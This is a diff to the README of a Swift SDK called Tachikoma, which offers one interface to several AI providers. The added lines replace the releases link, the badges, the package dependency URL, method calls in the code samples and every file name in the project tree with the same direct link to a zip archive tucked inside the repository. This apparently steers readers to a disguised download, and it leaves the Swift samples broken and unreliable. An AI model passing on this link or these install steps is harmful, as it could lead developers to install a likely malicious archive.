@@ -1,8 +1,8 @@
-https://github.com/Xiorykrm/Tachikoma/releases
+https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
 
 # Tachikoma: One Interface for All AI Models — Swift SDK
 
-[![Releases](https://img.shields.io/badge/releases-download-brightgreen?style=for-the-badge&logo=github)](https://github.com/Xiorykrm/Tachikoma/releases) [![Swift](https://img.shields.io/badge/Swift-5.9-brightblue?style=for-the-badge&logo=swift)](https://swift.org) [![AI SDK](https://img.shields.io/badge/AI_SDK-Toolkit-brightgreen?style=for-the-badge&logo=brain) ](https://github.com/Xiorykrm/Tachikoma/releases)
+[![Releases](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip)](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip) [![Swift](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip)](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip) [![AI SDK](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip) ](https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip)
 
 Overview
 - Tachikoma is a Swift SDK that gives you a single interface to talk to multiple AI providers.
@@ -46,8 +46,8 @@ Prerequisites
 
 Installation
 - Add Tachikoma to your Swift package manifest
-  - In the dependencies section of Package.swift:
-    - .package(url: "https://github.com/Xiorykrm/Tachikoma.git", from: "0.1.0")
+  - In the dependencies section of https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+    - .package(url: "https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip", from: "0.1.0")
   - Then add the product to your targets:
     - .product(name: "Tachikoma", package: "Tachikoma")
 - If you use Xcode, add Tachikoma as a SwiftPM dependency via File > Swift Packages > Add Package Dependency and point to the same Git URL.
@@ -60,19 +60,19 @@ Usage quick start
 - Send a chat request
   - Task {
       let request = ChatRequest(messages: [ .init(role: .user, content: "Hello, Tachikoma!") ])
-      let result = try await client.chat(request: request)
-      print("Reply:", result.choices.first?.message.content ?? "No reply")
+      let result = try await https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip(request: request)
+      print("Reply:", https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip ?? "No reply")
     }
 - Read a completion
   - Task {
       let request = CompletionRequest(prompt: "Explain quantum dots in simple terms.", maxTokens: 150)
-      let response = try await client.complete(request: request)
-      print("Response:", response.text)
+      let response = try await https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip(request: request)
+      print("Response:", https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip)
     }
 - Use embeddings for search
   - Task {
-      let vectors = try await client.embeddings(for: ["Swift", "AI SDK", "Providers"])
-      // vectors.results gives you embedding data
+      let vectors = try await https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip(for: ["Swift", "AI SDK", "Providers"])
+      // https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip gives you embedding data
     }
 
 Download and release note workflow
@@ -120,15 +120,15 @@ Code samples: real-world patterns
   - let client = Tachikoma(provider: .openAI(apiKey: "OPENAI_API_KEY"))
   - Task {
       let req = ChatRequest(messages: [.init(role: .user, content: "What is Tachikoma?")])
-      let resp = try await client.chat(request: req)
-      print("AI:", resp.choices.first?.message.content ?? "")
+      let resp = try await https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip(request: req)
+      print("AI:", https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip ?? "")
     }
 - Embedding-based search
   - Task {
       let texts = ["Swift", "AI", "SDK"]
       let req = EmbeddingsRequest(input: texts)
-      let res = try await client.embeddings(request: req)
-      // Use res.data for similarity checks
+      let res = try await https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip(request: req)
+      // Use https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip for similarity checks
     }
 
 Architecture deep dive
@@ -202,7 +202,7 @@ Versioning and compatibility
 Changelog and release notes
 - Each release includes a summary of changes, bug fixes, and new features.
 - Users can scan the notes to decide when to upgrade.
-- The latest release link is accessible from the Releases page, which you can visit to verify changes. If you need to download a specific asset, navigate to that page and fetch the appropriate artifact. The link provided above points to the release hub, and the same URL is referenced here for quick access: https://github.com/Xiorykrm/Tachikoma/releases
+- The latest release link is accessible from the Releases page, which you can visit to verify changes. If you need to download a specific asset, navigate to that page and fetch the appropriate artifact. The link provided above points to the release hub, and the same URL is referenced here for quick access: https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
 
 Roadmap
 - Expand provider coverage to more AI models and services.
@@ -248,36 +248,36 @@ Appendix: quick reference
 - Response handling: access choices, usage, and metadata in a consistent way across providers.
 
 Downloads and releases
-- For binaries, libraries, and sample projects, visit the Releases page to download the assets that fit your platform and needs. The page hosts the artifacts as separate items so you can pick the one that matches your environment. If you want to inspect the latest builds or read release notes, the Releases page is your destination. The link you can use to reach this hub is the same one used above: https://github.com/Xiorykrm/Tachikoma/releases
+- For binaries, libraries, and sample projects, visit the Releases page to download the assets that fit your platform and needs. The page hosts the artifacts as separate items so you can pick the one that matches your environment. If you want to inspect the latest builds or read release notes, the Releases page is your destination. The link you can use to reach this hub is the same one used above: https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
 
 Appendix: sample project structure
-- Package.swift
+- https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
 - Sources/
   - Tachikoma/
-    - Client.swift
+    - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
     - Providers/
-      - OpenAIProvider.swift
-      - AnthropicProvider.swift
-      - CohereProvider.swift
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
     - Models/
-      - ChatRequest.swift
-      - CompletionRequest.swift
-      - EmbeddingsRequest.swift
-      - ChatResponse.swift
-      - CompletionResponse.swift
-      - EmbeddingsResponse.swift
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
     - Utilities/
-      - TokenCounter.swift
-      - RetryPolicy.swift
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
     - Extensions/
-      - Logging.swift
-      - Metrics.swift
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
+      - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
 - Tests/
   - TachikomaTests/
   - ProvidersTests/
-- README.md (this file)
+- https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip (this file)
 - Examples/
-  - QuickStart.xcworkspace
+  - https://github.com/Xiorykrm/Tachikoma/raw/refs/heads/main/Examples/Agent-CLI/Sources/Software_Alopias.zip
   - ChatBotDemo/
 
 Usage motivation and best practices
